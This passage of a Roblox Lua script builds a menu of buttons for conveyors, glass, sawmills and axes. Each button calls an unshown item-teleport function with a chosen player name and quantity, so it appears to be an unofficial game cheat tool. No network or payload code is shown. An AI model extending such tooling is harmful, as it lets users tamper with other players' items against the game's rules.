ConvMove.Position =  UDim2.new(0, 3, 0, 119)
ConvMove.Size = UDim2.new(0, 164, 0, 20)
ConvMove.Font = Enum.Font.Fantasy
ConvMove.Text = "Sort Conveyors"
ConvMove.TextColor3 = Color3.new(1, 1, 1)
ConvMove.TextSize = 14
ConvMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

StraightConveyor = Instance.new("ImageButton")
StraightConveyor.Name = "StraightConveyor"
StraightConveyor.Parent = MoveConv
StraightConveyor.BackgroundColor3 = Color3.new(1, 1, 1)
StraightConveyor.BackgroundTransparency = 1
StraightConveyor.BorderColor3 = Color3.new(0.6, 0, 0)
StraightConveyor.Position = UDim2.new(0, 5, 0, 5)
StraightConveyor.Size = UDim2.new(0, 100, 0, 100)
StraightConveyor.Image = "rbxassetid://3703715036"
StraightConveyor.MouseButton1Down:connect(function()
Type.Text = "Straight Conveyor"
SingleItemTpQty("StraightConveyor", PlyrSelz.Text, qty.Text)
end)

CountItems42 = Instance.new("TextLabel")
CountItems42.Parent = MoveConv
CountItems42.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems42.BackgroundTransparency = 0.6
CountItems42.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems42.Position = UDim2.new(0, 110, 0, 55)
CountItems42.Size = UDim2.new(0, 25, 0, 20)
CountItems42.Font = Enum.Font.SourceSans
CountItems42.Text = "0"
CountItems42.TextColor3 = Color3.new(0, 1, 0)
CountItems42.TextSize = 25

TiltConveyor = Instance.new("ImageButton")
TiltConveyor.Name = "TiltConveyor"
TiltConveyor.Parent = MoveConv
TiltConveyor.BackgroundColor3 = Color3.new(1, 1, 1)
TiltConveyor.BackgroundTransparency = 1
TiltConveyor.BorderColor3 = Color3.new(0.6, 0, 0)
TiltConveyor.Position = UDim2.new(0, 5, 0, 105)
TiltConveyor.Size = UDim2.new(0, 100, 0, 100)
TiltConveyor.Image = "rbxassetid://3703717392"
TiltConveyor.MouseButton1Down:connect(function()
Type.Text = "Tilt Conveyor"
SingleItemTpQty("TiltConveyor", PlyrSelz.Text, qty.Text)
end)

CountItems43 = Instance.new("TextLabel")
CountItems43.Parent = MoveConv
CountItems43.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems43.BackgroundTransparency = 0.6
CountItems43.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems43.Position = UDim2.new(0, 110, 0, 160)
CountItems43.Size = UDim2.new(0, 25, 0, 20)
CountItems43.Font = Enum.Font.SourceSans
CountItems43.Text = "0"
CountItems43.TextColor3 = Color3.new(0, 1, 0)
CountItems43.TextSize = 25

TightTurnConveyor = Instance.new("ImageButton")
TightTurnConveyor.Name = "TightTurnConveyor"
TightTurnConveyor.Parent = MoveConv
TightTurnConveyor.BackgroundColor3 = Color3.new(1, 1, 1)
TightTurnConveyor.BackgroundTransparency = 1
TightTurnConveyor.BorderColor3 = Color3.new(0.6, 0, 0)
TightTurnConveyor.Position = UDim2.new(0, 5, 0, 210)
TightTurnConveyor.Size = UDim2.new(0, 100, 0, 100)
TightTurnConveyor.Image = "rbxassetid://3703716592"
TightTurnConveyor.MouseButton1Down:connect(function()
Type.Text = "Tight  Turn Conveyor"
SingleItemTpQty("TightTurnConveyor", PlyrSelz.Text, qty.Text)
end)

CountItems44 = Instance.new("TextLabel")
CountItems44.Parent = MoveConv
CountItems44.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems44.BackgroundTransparency = 0.6
CountItems44.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems44.Position = UDim2.new(0, 110, 0, 265)
CountItems44.Size = UDim2.new(0, 25, 0, 20)
CountItems44.Font = Enum.Font.SourceSans
CountItems44.Text = "0"
CountItems44.TextColor3 = Color3.new(0, 1, 0)
CountItems44.TextSize = 25

ConveyorFunnel = Instance.new("ImageButton")
ConveyorFunnel.Name = "ConveyorFunnel"
ConveyorFunnel.Parent = MoveConv
ConveyorFunnel.BackgroundColor3 = Color3.new(1, 1, 1)
ConveyorFunnel.BackgroundTransparency = 1
ConveyorFunnel.BorderColor3 = Color3.new(0.6, 0, 0)
ConveyorFunnel.Position = UDim2.new(0, 5, 0, 315)
ConveyorFunnel.Size = UDim2.new(0, 100, 0, 100)
ConveyorFunnel.Image = "rbxassetid://3703713578"
ConveyorFunnel.MouseButton1Down:connect(function()
Type.Text = "Conveyor Funnel"
SingleItemTpQty("ConveyorFunnel", PlyrSelz.Text, qty.Text)
end)

CountItems45 = Instance.new("TextLabel")
CountItems45.Parent = MoveConv
CountItems45.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems45.BackgroundTransparency = 0.6
CountItems45.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems45.Position = UDim2.new(0, 110, 0, 370)
CountItems45.Size = UDim2.new(0, 25, 0, 20)
CountItems45.Font = Enum.Font.SourceSans
CountItems45.Text = "0"
CountItems45.TextColor3 = Color3.new(0, 1, 0)
CountItems45.TextSize = 25

ConveyorSwitch = Instance.new("ImageButton")
ConveyorSwitch.Name = "ConveyorSwitch"
ConveyorSwitch.Parent = MoveConv
ConveyorSwitch.BackgroundColor3 = Color3.new(1, 1, 1)
ConveyorSwitch.BackgroundTransparency = 1
ConveyorSwitch.BorderColor3 = Color3.new(0.6, 0, 0)
ConveyorSwitch.Position = UDim2.new(0, 5, 0, 420)
ConveyorSwitch.Size = UDim2.new(0, 100, 0, 100)
ConveyorSwitch.Image = "rbxassetid://3703714308"
ConveyorSwitch.MouseButton1Down:connect(function()
Type.Text = "Conveyor Switch"
SingleItemTpQty("ConveyorSwitch", PlyrSelz.Text, qty.Text)
end)

CountItems46 = Instance.new("TextLabel")
CountItems46.Parent = MoveConv
CountItems46.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems46.BackgroundTransparency = 0.6
CountItems46.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems46.Position = UDim2.new(0, 110, 0, 475)
CountItems46.Size = UDim2.new(0, 25, 0, 20)
CountItems46.Font = Enum.Font.SourceSans
CountItems46.Text = "0"
CountItems46.TextColor3 = Color3.new(0, 1, 0)
CountItems46.TextSize = 25

StraightSwitchConveyorRight = Instance.new("ImageButton")
StraightSwitchConveyorRight.Name = "StraightSwitchConveyorRight"
StraightSwitchConveyorRight.Parent = MoveConv
StraightSwitchConveyorRight.BackgroundColor3 = Color3.new(1, 1, 1)
StraightSwitchConveyorRight.BackgroundTransparency = 1
StraightSwitchConveyorRight.BorderColor3 = Color3.new(0.6, 0, 0)
StraightSwitchConveyorRight.Position = UDim2.new(0, 5, 0, 525)
StraightSwitchConveyorRight.Size = UDim2.new(0, 100, 0, 100)
StraightSwitchConveyorRight.Image = "rbxassetid://3703716046"
StraightSwitchConveyorRight.MouseButton1Down:connect(function()
Type.Text = "Switch Conveyor Right"
SingleItemTpQty("StraightSwitchConveyorRight", PlyrSelz.Text, qty.Text)
end)

CountItems47 = Instance.new("TextLabel")
CountItems47.Parent = MoveConv
CountItems47.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems47.BackgroundTransparency = 0.6
CountItems47.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems47.Position = UDim2.new(0, 110, 0, 580)
CountItems47.Size = UDim2.new(0, 25, 0, 20)
CountItems47.Font = Enum.Font.SourceSans
CountItems47.Text = "0"
CountItems47.TextColor3 = Color3.new(0, 1, 0)
CountItems47.TextSize = 25

StraightSwitchConveyorLeft = Instance.new("ImageButton")
StraightSwitchConveyorLeft.Name = "StraightSwitchConveyorLeft"
StraightSwitchConveyorLeft.Parent = MoveConv
StraightSwitchConveyorLeft.BackgroundColor3 = Color3.new(1, 1, 1)
StraightSwitchConveyorLeft.BackgroundTransparency = 1
StraightSwitchConveyorLeft.BorderColor3 = Color3.new(0.6, 0, 0)
StraightSwitchConveyorLeft.Position = UDim2.new(0, 5, 0, 630)
StraightSwitchConveyorLeft.Size = UDim2.new(0, 100, 0, 100)
StraightSwitchConveyorLeft.Image = "rbxassetid://3703715644"
StraightSwitchConveyorLeft.MouseButton1Down:connect(function()
Type.Text = "Switch Conveyor Left"
SingleItemTpQty("StraightSwitchConveyorLeft", PlyrSelz.Text, qty.Text)
end)

CountItems48 = Instance.new("TextLabel")
CountItems48.Parent = MoveConv
CountItems48.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems48.BackgroundTransparency = 0.6
CountItems48.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems48.Position = UDim2.new(0, 110, 0, 685)
CountItems48.Size = UDim2.new(0, 25, 0, 20)
CountItems48.Font = Enum.Font.SourceSans
CountItems48.Text = "0"
CountItems48.TextColor3 = Color3.new(0, 1, 0)
CountItems48.TextSize = 25

LogSweeper = Instance.new("ImageButton")
LogSweeper.Name = "LogSweeper"
LogSweeper.Parent = MoveConv
LogSweeper.BackgroundColor3 = Color3.new(1, 1, 1)
LogSweeper.BackgroundTransparency = 1
LogSweeper.BorderColor3 = Color3.new(0.6, 0, 0)
LogSweeper.Position = UDim2.new(0, 5, 0, 735)
LogSweeper.Size = UDim2.new(0, 100, 0, 100)
LogSweeper.Image = "rbxassetid://3703714663"
LogSweeper.MouseButton1Down:connect(function()
Type.Text = "Log Sweeper"
SingleItemTpQty("LogSweeper", PlyrSelz.Text, qty.Text)
end)

CountItems49 = Instance.new("TextLabel")
CountItems49.Parent = MoveConv
CountItems49.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems49.BackgroundTransparency = 0.6
CountItems49.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems49.Position = UDim2.new(0, 110, 0, 790)
CountItems49.Size = UDim2.new(0, 25, 0, 20)
CountItems49.Font = Enum.Font.SourceSans
CountItems49.Text = "0"
CountItems49.TextColor3 = Color3.new(0, 1, 0)
CountItems49.TextSize = 25

ConveyorSupports = Instance.new("ImageButton")
ConveyorSupports.Name = "ConveyorSupports"
ConveyorSupports.Parent = MoveConv
ConveyorSupports.BackgroundColor3 = Color3.new(1, 1, 1)
ConveyorSupports.BackgroundTransparency = 1
ConveyorSupports.BorderColor3 = Color3.new(0.6, 0, 0)
ConveyorSupports.Position = UDim2.new(0, 5, 0, 840)
ConveyorSupports.Size = UDim2.new(0, 100, 0, 100)
ConveyorSupports.Image = "rbxassetid://3703713976"
ConveyorSupports.MouseButton1Down:connect(function()
Type.Text = "Conveyor Supports"
SingleItemTpQty("ConveyorSupports", PlyrSelz.Text, qty.Text)
end)

CountItems50 = Instance.new("TextLabel")
CountItems50.Parent = MoveConv
CountItems50.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems50.BackgroundTransparency = 0.6
CountItems50.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems50.Position = UDim2.new(0, 110, 0, 895)
CountItems50.Size = UDim2.new(0, 25, 0, 20)
CountItems50.Font = Enum.Font.SourceSans
CountItems50.Text = "0"
CountItems50.TextColor3 = Color3.new(0, 1, 0)
CountItems50.TextSize = 25

TightTurnConveyorSupports = Instance.new("ImageButton")
TightTurnConveyorSupports.Name = "TightTurnConveyorSupports"
TightTurnConveyorSupports.Parent = MoveConv
TightTurnConveyorSupports.BackgroundColor3 = Color3.new(1, 1, 1)
TightTurnConveyorSupports.BackgroundTransparency = 1
TightTurnConveyorSupports.BorderColor3 = Color3.new(0.6, 0, 0)
TightTurnConveyorSupports.Position = UDim2.new(0, 5, 0, 945)
TightTurnConveyorSupports.Size = UDim2.new(0, 100, 0, 100)
TightTurnConveyorSupports.Image = "rbxassetid://3703716982"
TightTurnConveyorSupports.MouseButton1Down:connect(function()
Type.Text = "Tight Turn Supports"
SingleItemTpQty("TightTurnConveyorSupports", PlyrSelz.Text, qty.Text)
end)

CountItems51 = Instance.new("TextLabel")
CountItems51.Parent = MoveConv
CountItems51.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems51.BackgroundTransparency = 0.6
CountItems51.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems51.Position = UDim2.new(0, 110, 0, 1000)
CountItems51.Size = UDim2.new(0, 25, 0, 20)
CountItems51.Font = Enum.Font.SourceSans
CountItems51.Text = "0"
CountItems51.TextColor3 = Color3.new(0, 1, 0)
CountItems51.TextSize = 25

MoveGlass = Instance.new("ScrollingFrame")
MoveGlass.Name = "MoveGlass"
MoveGlass.Parent = MenuFrame
MoveGlass.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveGlass.BackgroundTransparency = 0.5
MoveGlass.Position =  UDim2.new(0, 179, 0, 0)
MoveGlass.BorderColor3 = Color3.new(0, 0, 0)
MoveGlass.Size = UDim2.new(0, 195, 0, 450)
MoveGlass.CanvasPosition = Vector2.new(0,0)
MoveGlass.CanvasSize = UDim2.new(0, 0, 0, 1060)
MoveGlass.Visible = false

GlassMove = Instance.new("TextButton")
GlassMove.Name = "GlassMove"
GlassMove.Parent = MoveFrame
GlassMove.BackgroundColor3 = Color3.new(0, 0, 0)
GlassMove.BorderColor3 = Color3.new(1, 0, 0)
GlassMove.BackgroundTransparency = 0.6
GlassMove.Position =  UDim2.new(0, 3, 0, 142)
GlassMove.Size = UDim2.new(0, 164, 0, 20)
GlassMove.Font = Enum.Font.Fantasy
GlassMove.Text = "Sort Glass + Mills"
GlassMove.TextColor3 = Color3.new(1, 1, 1)
GlassMove.TextSize = 14
GlassMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

GlassDoor1 = Instance.new("ImageButton")
GlassDoor1.Name = "GlassDoor1"
GlassDoor1.Parent = MoveGlass
GlassDoor1.BackgroundColor3 = Color3.new(1, 1, 1)
GlassDoor1.BackgroundTransparency = 0
GlassDoor1.BorderColor3 = Color3.new(0.6, 0, 0)
GlassDoor1.Position = UDim2.new(0, 5, 0, 5)
GlassDoor1.Size = UDim2.new(0, 100, 0, 100)
GlassDoor1.Image = "rbxassetid://3704030871"
GlassDoor1.MouseButton1Down:connect(function()
Type.Text = "Basic Glass Door"
SingleItemTpQty("GlassDoor1", PlyrSelz.Text, qty.Text)
end)

CountItems52 = Instance.new("TextLabel")
CountItems52.Parent = MoveGlass
CountItems52.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems52.BackgroundTransparency = 0.6
CountItems52.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems52.Position = UDim2.new(0, 110, 0, 55)
CountItems52.Size = UDim2.new(0, 25, 0, 20)
CountItems52.Font = Enum.Font.SourceSans
CountItems52.Text = "0"
CountItems52.TextColor3 = Color3.new(0, 1, 0)
CountItems52.TextSize = 25

GlassPane1 = Instance.new("ImageButton")
GlassPane1.Name = "GlassPane1"
GlassPane1.Parent = MoveGlass
GlassPane1.BackgroundColor3 = Color3.new(1, 1, 1)
GlassPane1.BackgroundTransparency = 0
GlassPane1.BorderColor3 = Color3.new(0.6, 0, 0)
GlassPane1.Position = UDim2.new(0, 5, 0, 105)
GlassPane1.Size = UDim2.new(0, 100, 0, 100)
GlassPane1.Image = "rbxassetid://3704031272"
GlassPane1.MouseButton1Down:connect(function()
Type.Text = "Tiny Glass Pane"
SingleItemTpQty("GlassPane1", PlyrSelz.Text, qty.Text)
end)

CountItems53 = Instance.new("TextLabel")
CountItems53.Parent = MoveGlass
CountItems53.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems53.BackgroundTransparency = 0.6
CountItems53.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems53.Position = UDim2.new(0, 110, 0, 160)
CountItems53.Size = UDim2.new(0, 25, 0, 20)
CountItems53.Font = Enum.Font.SourceSans
CountItems53.Text = "0"
CountItems53.TextColor3 = Color3.new(0, 1, 0)
CountItems53.TextSize = 25

GlassPane2 = Instance.new("ImageButton")
GlassPane2.Name = "GlassPane2"
GlassPane2.Parent = MoveGlass
GlassPane2.BackgroundColor3 = Color3.new(1, 1, 1)
GlassPane2.BackgroundTransparency = 0
GlassPane2.BorderColor3 = Color3.new(0.6, 0, 0)
GlassPane2.Position = UDim2.new(0, 5, 0, 210)
GlassPane2.Size = UDim2.new(0, 100, 0, 100)
GlassPane2.Image = "rbxassetid://3704031673"
GlassPane2.MouseButton1Down:connect(function()
Type.Text = "Glass Pane 2"
SingleItemTpQty("GlassPane2", PlyrSelz.Text, qty.Text)
end)

CountItems54 = Instance.new("TextLabel")
CountItems54.Parent = MoveGlass
CountItems54.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems54.BackgroundTransparency = 0.6
CountItems54.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems54.Position = UDim2.new(0, 110, 0, 265)
CountItems54.Size = UDim2.new(0, 25, 0, 20)
CountItems54.Font = Enum.Font.SourceSans
CountItems54.Text = "0"
CountItems54.TextColor3 = Color3.new(0, 1, 0)
CountItems54.TextSize = 25

GlassPane3 = Instance.new("ImageButton")
GlassPane3.Name = "GlassPane3"
GlassPane3.Parent = MoveGlass
GlassPane3.BackgroundColor3 = Color3.new(1, 1, 1)
GlassPane3.BackgroundTransparency = 0
GlassPane3.BorderColor3 = Color3.new(0.6, 0, 0)
GlassPane3.Position = UDim2.new(0, 5, 0, 315)
GlassPane3.Size = UDim2.new(0, 100, 0, 100)
GlassPane3.Image = "rbxassetid://3704032028"
GlassPane3.MouseButton1Down:connect(function()
Type.Text = "Glass Pane 3"
SingleItemTpQty("GlassPane3", PlyrSelz.Text, qty.Text)
end)

CountItems55 = Instance.new("TextLabel")
CountItems55.Parent = MoveGlass
CountItems55.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems55.BackgroundTransparency = 0.6
CountItems55.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems55.Position = UDim2.new(0, 110, 0, 370)
CountItems55.Size = UDim2.new(0, 25, 0, 20)
CountItems55.Font = Enum.Font.SourceSans
CountItems55.Text = "0"
CountItems55.TextColor3 = Color3.new(0, 1, 0)
CountItems55.TextSize = 25

GlassPane4 = Instance.new("ImageButton")
GlassPane4.Name = "GlassPane4"
GlassPane4.Parent = MoveGlass
GlassPane4.BackgroundColor3 = Color3.new(1, 1, 1)
GlassPane4.BackgroundTransparency = 0
GlassPane4.BorderColor3 = Color3.new(0.6, 0, 0)
GlassPane4.Position = UDim2.new(0, 5, 0, 420)
GlassPane4.Size = UDim2.new(0, 100, 0, 100)
GlassPane4.Image = "rbxassetid://3704032365"
GlassPane4.MouseButton1Down:connect(function()
Type.Text = "Large Glass Pane"
SingleItemTpQty("GlassPane4", PlyrSelz.Text, qty.Text)
end)

CountItems56 = Instance.new("TextLabel")
CountItems56.Parent = MoveGlass
CountItems56.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems56.BackgroundTransparency = 0.6
CountItems56.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems56.Position = UDim2.new(0, 110, 0, 475)
CountItems56.Size = UDim2.new(0, 25, 0, 20)
CountItems56.Font = Enum.Font.SourceSans
CountItems56.Text = "0"
CountItems56.TextColor3 = Color3.new(0, 1, 0)
CountItems56.TextSize = 25

Sawmill = Instance.new("ImageButton")
Sawmill.Name = "Sawmill"
Sawmill.Parent = MoveGlass
Sawmill.BackgroundColor3 = Color3.new(1, 1, 1)
Sawmill.BackgroundTransparency = 1
Sawmill.BorderColor3 = Color3.new(0.6, 0, 0)
Sawmill.Position = UDim2.new(0, 5, 0, 525)
Sawmill.Size = UDim2.new(0, 100, 0, 100)
Sawmill.Image = "rbxassetid://3704332953"
Sawmill.MouseButton1Down:connect(function()
Type.Text = "Shabby Sawmill"
SingleItemTpQty("Sawmill", PlyrSelz.Text, qty.Text)
end)

CountItems57 = Instance.new("TextLabel")
CountItems57.Parent = MoveGlass
CountItems57.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems57.BackgroundTransparency = 0.6
CountItems57.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems57.Position = UDim2.new(0, 110, 0, 580)
CountItems57.Size = UDim2.new(0, 25, 0, 20)
CountItems57.Font = Enum.Font.SourceSans
CountItems57.Text = "0"
CountItems57.TextColor3 = Color3.new(0, 1, 0)
CountItems57.TextSize = 25

Sawmill2 = Instance.new("ImageButton")
Sawmill2.Name = "Sawmill2"
Sawmill2.Parent = MoveGlass
Sawmill2.BackgroundColor3 = Color3.new(1, 1, 1)
Sawmill2.BackgroundTransparency = 1
Sawmill2.BorderColor3 = Color3.new(0.6, 0, 0)
Sawmill2.Position = UDim2.new(0, 5, 0, 630)
Sawmill2.Size = UDim2.new(0, 100, 0, 100)
Sawmill2.Image = "rbxassetid://3704333368"
Sawmill2.MouseButton1Down:connect(function()
Type.Text = "Fair Sawmill"
SingleItemTpQty("Sawmill2", PlyrSelz.Text, qty.Text)
end)

CountItems58 = Instance.new("TextLabel")
CountItems58.Parent = MoveGlass
CountItems58.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems58.BackgroundTransparency = 0.6
CountItems58.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems58.Position = UDim2.new(0, 110, 0, 685)
CountItems58.Size = UDim2.new(0, 25, 0, 20)
CountItems58.Font = Enum.Font.SourceSans
CountItems58.Text = "0"
CountItems58.TextColor3 = Color3.new(0, 1, 0)
CountItems58.TextSize = 25

Sawmill3 = Instance.new("ImageButton")
Sawmill3.Name = "Sawmill3"
Sawmill3.Parent = MoveGlass
Sawmill3.BackgroundColor3 = Color3.new(1, 1, 1)
Sawmill3.BackgroundTransparency = 1
Sawmill3.BorderColor3 = Color3.new(0.6, 0, 0)
Sawmill3.Position = UDim2.new(0, 5, 0, 735)
Sawmill3.Size = UDim2.new(0, 100, 0, 100)
Sawmill3.Image = "rbxassetid://3704333727"
Sawmill3.MouseButton1Down:connect(function()
Type.Text = "Sawmax 01"
SingleItemTpQty("Sawmill3", PlyrSelz.Text, qty.Text)
end)

CountItems59 = Instance.new("TextLabel")
CountItems59.Parent = MoveGlass
CountItems59.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems59.BackgroundTransparency = 0.6
CountItems59.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems59.Position = UDim2.new(0, 110, 0, 790)
CountItems59.Size = UDim2.new(0, 25, 0, 20)
CountItems59.Font = Enum.Font.SourceSans
CountItems59.Text = "0"
CountItems59.TextColor3 = Color3.new(0, 1, 0)
CountItems59.TextSize = 25

Sawmill4 = Instance.new("ImageButton")
Sawmill4.Name = "Sawmill4"
Sawmill4.Parent = MoveGlass
Sawmill4.BackgroundColor3 = Color3.new(1, 1, 1)
Sawmill4.BackgroundTransparency = 1
Sawmill4.BorderColor3 = Color3.new(0.6, 0, 0)
Sawmill4.Position = UDim2.new(0, 5, 0, 840)
Sawmill4.Size = UDim2.new(0, 100, 0, 100)
Sawmill4.Image = "rbxassetid://3704334131"
Sawmill4.MouseButton1Down:connect(function()
Type.Text = "Sawmax 02"
SingleItemTpQty("Sawmill4", PlyrSelz.Text, qty.Text)
end)

CountItems60 = Instance.new("TextLabel")
CountItems60.Parent = MoveGlass
CountItems60.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems60.BackgroundTransparency = 0.6
CountItems60.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems60.Position = UDim2.new(0, 110, 0, 895)
CountItems60.Size = UDim2.new(0, 25, 0, 20)
CountItems60.Font = Enum.Font.SourceSans
CountItems60.Text = "0"
CountItems60.TextColor3 = Color3.new(0, 1, 0)
CountItems60.TextSize = 25

Sawmill4L = Instance.new("ImageButton")
Sawmill4L.Name = "Sawmill4L"
Sawmill4L.Parent = MoveGlass
Sawmill4L.BackgroundColor3 = Color3.new(1, 1, 1)
Sawmill4L.BackgroundTransparency = 1
Sawmill4L.BorderColor3 = Color3.new(0.6, 0, 0)
Sawmill4L.Position = UDim2.new(0, 5, 0, 945)
Sawmill4L.Size = UDim2.new(0, 100, 0, 100)
Sawmill4L.Image = "rbxassetid://3704334524"
Sawmill4L.MouseButton1Down:connect(function()
Type.Text = "Sawmax 02L"
SingleItemTpQty("Sawmill4L", PlyrSelz.Text, qty.Text)
end)

CountItems61 = Instance.new("TextLabel")
CountItems61.Parent = MoveGlass
CountItems61.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems61.BackgroundTransparency = 0.6
CountItems61.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems61.Position = UDim2.new(0, 110, 0, 1000)
CountItems61.Size = UDim2.new(0, 25, 0, 20)
CountItems61.Font = Enum.Font.SourceSans
CountItems61.Text = "0"
CountItems61.TextColor3 = Color3.new(0, 1, 0)
CountItems61.TextSize = 25

MoveAxes = Instance.new("ScrollingFrame")
MoveAxes.Name = "MoveAxes"
MoveAxes.Parent = MenuFrame
MoveAxes.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveAxes.BackgroundTransparency = 0.5
MoveAxes.Position =  UDim2.new(0, 179, 0, 0)
MoveAxes.BorderColor3 = Color3.new(0, 0, 0)
MoveAxes.Size = UDim2.new(0, 195, 0, 450)
MoveAxes.CanvasPosition = Vector2.new(0,0)
MoveAxes.CanvasSize = UDim2.new(0, 0, 0, 2020)
MoveAxes.Visible = false

AxesMove = Instance.new("TextButton")
AxesMove.Name = "AxesMove"
AxesMove.Parent = MoveFrame
AxesMove.BackgroundColor3 = Color3.new(0, 0, 0)
AxesMove.BorderColor3 = Color3.new(1, 0, 0)
AxesMove.BackgroundTransparency = 0.6
AxesMove.Position =  UDim2.new(0, 3, 0, 165)
AxesMove.Size = UDim2.new(0, 164, 0, 20)
AxesMove.Font = Enum.Font.Fantasy
AxesMove.Text = "Sort Axes"
AxesMove.TextColor3 = Color3.new(1, 1, 1)
AxesMove.TextSize = 14
AxesMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

BasicHatchet = Instance.new("ImageButton")
BasicHatchet.Name = "BasicHatchet"
BasicHatchet.Parent = MoveAxes
BasicHatchet.BackgroundColor3 = Color3.new(1, 1, 1)
BasicHatchet.BackgroundTransparency = 1
BasicHatchet.BorderColor3 = Color3.new(0.6, 0, 0)
BasicHatchet.Position = UDim2.new(0, 5, 0, 5)
BasicHatchet.Size = UDim2.new(0, 100, 0, 100)
BasicHatchet.Image = "rbxassetid://3210371764"
BasicHatchet.MouseButton1Down:connect(function()
Type.Text = "BasicHatchet"
SingleItemTpQty("BasicHatchet", PlyrSelz.Text, qty.Text)
end)

CountItems62 = Instance.new("TextLabel")
CountItems62.Parent = MoveAxes
CountItems62.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems62.BackgroundTransparency = 0.6
CountItems62.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems62.Position = UDim2.new(0, 110, 0, 55)
CountItems62.Size = UDim2.new(0, 25, 0, 20)
CountItems62.Font = Enum.Font.SourceSans
CountItems62.Text = "0"
CountItems62.TextColor3 = Color3.new(0, 1, 0)
CountItems62.TextSize = 25

Axe1 = Instance.new("ImageButton")
Axe1.Name = "Axe1"
Axe1.Parent = MoveAxes
Axe1.BackgroundColor3 = Color3.new(1, 1, 1)
Axe1.BackgroundTransparency = 1
Axe1.BorderColor3 = Color3.new(0.6, 0, 0)
Axe1.Position = UDim2.new(0, 5, 0, 105)
Axe1.Size = UDim2.new(0, 100, 0, 100)
Axe1.Image = "rbxassetid://3210409775"
Axe1.MouseButton1Down:connect(function()
Type.Text = "Plain Axe"
SingleItemTpQty("Axe1", PlyrSelz.Text, qty.Text)
end)

CountItems63 = Instance.new("TextLabel")
CountItems63.Parent = MoveAxes
CountItems63.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems63.BackgroundTransparency = 0.6
CountItems63.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems63.Position = UDim2.new(0, 110, 0, 160)
CountItems63.Size = UDim2.new(0, 25, 0, 20)
CountItems63.Font = Enum.Font.SourceSans
CountItems63.Text = "0"
CountItems63.TextColor3 = Color3.new(0, 1, 0)
CountItems63.TextSize = 25

Axe2 = Instance.new("ImageButton")
Axe2.Name = "Axe2"
Axe2.Parent = MoveAxes
Axe2.BackgroundColor3 = Color3.new(1, 1, 1)
Axe2.BackgroundTransparency = 1
Axe2.BorderColor3 = Color3.new(0.6, 0, 0)
Axe2.Position = UDim2.new(0, 5, 0, 210)
Axe2.Size = UDim2.new(0, 100, 0, 100)
Axe2.Image = "rbxassetid://3210411391"
Axe2.MouseButton1Down:connect(function()
Type.Text = "Steal Axe"
SingleItemTpQty("Axe2", PlyrSelz.Text, qty.Text)
end)

CountItems64 = Instance.new("TextLabel")
CountItems64.Parent = MoveAxes
CountItems64.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems64.BackgroundTransparency = 0.6
CountItems64.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems64.Position = UDim2.new(0, 110, 0, 265)
CountItems64.Size = UDim2.new(0, 25, 0, 20)
CountItems64.Font = Enum.Font.SourceSans
CountItems64.Text = "0"
CountItems64.TextColor3 = Color3.new(0, 1, 0)
CountItems64.TextSize = 25

AxeAlphaTesters = Instance.new("ImageButton")
AxeAlphaTesters.Name = "AxeAlphaTesters"
AxeAlphaTesters.Parent = MoveAxes
AxeAlphaTesters.BackgroundColor3 = Color3.new(1, 1, 1)
AxeAlphaTesters.BackgroundTransparency = 1
AxeAlphaTesters.BorderColor3 = Color3.new(0.6, 0, 0)
AxeAlphaTesters.Position = UDim2.new(0, 5, 0, 315)
AxeAlphaTesters.Size = UDim2.new(0, 100, 0, 100)
AxeAlphaTesters.Image = "rbxassetid://3210418097"
AxeAlphaTesters.MouseButton1Down:connect(function()
Type.Text = "AxeAlphaTesters"
SingleItemTpQty("AxeAlphaTesters", PlyrSelz.Text, qty.Text)
end)

CountItems65 = Instance.new("TextLabel")
CountItems65.Parent = MoveAxes
CountItems65.BackgroundColor3 = Color3.new(0, 0, 0)
